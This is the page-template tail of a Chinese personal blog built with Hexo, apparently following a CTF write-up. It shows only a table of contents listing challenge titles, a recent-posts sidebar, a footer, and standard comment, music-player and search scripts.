class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%89%E6%96%87%E5%AD%97%EF%BC%8C%E6%89%80%E4%BB%A5%E6%90%9C%E7%B4%A2%E5%BE%88%E6%9C%89%E7%94%A8"><span class="toc-number">4.4.</span> <span class="toc-text">前有文字，所以搜索很有用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSINT-%E5%A4%A9%E7%A9%BAbelong"><span class="toc-number">4.5.</span> <span class="toc-text">OSINT-天空belong</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-4"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%AB%E7%AC%91%EF%BC%8C%E4%BD%A0%E4%B9%9F%E8%BF%87%E4%B8%8D%E4%BA%86%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">5.1.</span> <span class="toc-text">别笑，你也过不了第二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multi-headach3"><span class="toc-number">5.2.</span> <span class="toc-text">multi-headach3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strange-login"><span class="toc-number">5.3.</span> <span class="toc-text">strange_login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9C%9F%E5%BE%97%E6%8E%A7%E5%88%B6%E4%BD%A0%E4%BA%86"><span class="toc-number">5.4.</span> <span class="toc-text">我真得控制你了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E5%B0%8FW%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%881%EF%BC%89"><span class="toc-number">5.5.</span> <span class="toc-text">黑客小W的故事（1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%87%E5%AE%99%E7%9A%84%E4%B8%AD%E5%BF%83%E6%98%AFphp"><span class="toc-number">5.6.</span> <span class="toc-text">宇宙的中心是php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE-%E5%BC%95%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">结尾&#x2F;引用</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/%E4%BF%A1%E5%AE%89roadmap/" title="信安roadmap">信安roadmap</a><time datetime="2026-01-31T08:12:25.000Z" title="发表于 2026-01-31 16:12:25">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/11/%E7%A7%98%E5%AF%86%E7%BB%93%E7%A4%BE%E5%BC%80%E5%8F%91%E6%B1%87%E6%8A%A5/" title="秘密结社开发汇报">秘密结社开发汇报</a><time datetime="2026-01-11T14:38:27.000Z" title="发表于 2026-01-11 22:38:27">2026-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/06/%E5%85%AD%E7%BA%A7%E7%94%9F%E8%AF%8D%E9%80%9F%E8%AE%B0%E6%9C%AC/" title="六级生词速记本——附考后感想">六级生词速记本——附考后感想</a><time datetime="2025-12-06T08:43:00.000Z" title="发表于 2025-12-06 16:43:00">2025-12-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%87%AA%E5%AD%A6%E7%9B%B8%E5%85%B3/" title="数据结构C++自学相关">数据结构C++自学相关</a><time datetime="2025-11-05T14:36:11.000Z" title="发表于 2025-11-05 22:36:11">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/29/NewStarCTF-2025/" title="NewStarCTF-2025">NewStarCTF-2025</a><time datetime="2025-09-29T11:45:40.000Z" title="发表于 2025-09-29 19:45:40">2025-09-29</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By nirvana_felis</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div><div class="footer_custom_text">爱来自中国❤</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoooo-ssfj0tji7-nirvanafelis-projects.vercel.app/',
      region: 'zh-CN',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoooo-ssfj0tji7-nirvanafelis-projects.vercel.app/',
      region: 'zh-CN',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><!-- ================== Neocities-style button box ================== -->
<div id="friendButtonBox">
  <div class="fb-preview">
    <a href="https://www.maonie.top/" target="_blank">
      <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://maonie.neocities.org/2.gif" alt="maonie">
    </a>
  </div>

  <textarea readonly onclick="this.select();">
&lt;a href=&quot;https://www.maonie.top/&quot; target=&quot;_blank&quot;&gt;
&lt;img src=&quot;https://maonie.neocities.org/2.gif&quot; alt=&quot;maonie&quot;&gt;
&lt;/a&gt;
</textarea>


  <p class="fb-hint">drag me 🖱️</p>
</div>

<script>
(function(){
  const box = document.getElementById("friendButtonBox");
  if (!box) return;

  let dragging = false;
  let offsetX = 0;
  let offsetY = 0;

  box.addEventListener("mousedown", (e) => {
    dragging = true;
    offsetX = e.clientX - box.offsetLeft;
    offsetY = e.clientY - box.offsetTop;
    box.style.opacity = "0.85";
  });

  document.addEventListener("mousemove", (e) => {
    if (!dragging) return;
    box.style.left = (e.clientX - offsetX) + "px";
    box.style.top  = (e.clientY - offsetY) + "px";
  });

  document.addEventListener("mouseup", () => {
    if (!dragging) return;
    dragging = false;
    box.style.opacity = "1";
  });
})();
</script>
<meting-js class="no-destroy" id="14440083372" server="netease" type="playlist" fixed="true" order="random" volume="0.3" list-folded="false" list-max-height="36vh"></meting-js><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>